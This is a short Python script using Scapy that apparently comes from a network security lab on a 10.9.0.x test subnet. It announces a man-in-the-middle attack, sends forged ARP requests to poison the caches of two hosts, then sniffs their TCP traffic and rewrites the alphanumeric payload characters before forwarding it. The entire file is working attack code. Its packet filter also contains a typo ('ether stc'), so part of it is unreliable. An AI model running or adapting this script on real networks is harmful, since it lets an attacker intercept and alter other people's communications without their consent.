
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

print("LAUNCHING MITM ATTACK..........")

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
         print(pkt[IP].src)
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)

         if pkt [TCP].payload:
            data = pkt[TCP].payload.load
            print("*** %s, length: %d" % (data, len(data)))

            newdata = re.sub(r'[0-9a-zA-Z]', r'Z', data.decode())

            send(newpkt/newdata)
         else:
            send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
         newpkt = IP(bytes(pkt[IP]))
         del(newpkt.chksum)
         del(newpkt[TCP].chksum)
         send(newpkt)

ether1 = Ether(src = MAC_M, dst = "ff:ff:ff:ff:ff:ff")  
arp1 = ARP(psrc = IP_B, hwsrc = MAC_M,
        pdst = IP_A)
arp1.op=1
frame1 = ether1/arp1
sendp(frame1)

ether2 = Ether(src = MAC_M, dst = "ff:ff:ff:ff:ff:ff")
arp2 = ARP(psrc = IP_A, hwsrc = MAC_M,
        pdst = IP_B)
arp2.op=1
frame2 = ether2/arp2
sendp(frame2)

filter_template = 'tcp and (ether src {A} or ether stc {B})'
f = filter_template.format(A=MAC_A, B=MAC_B)
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)   
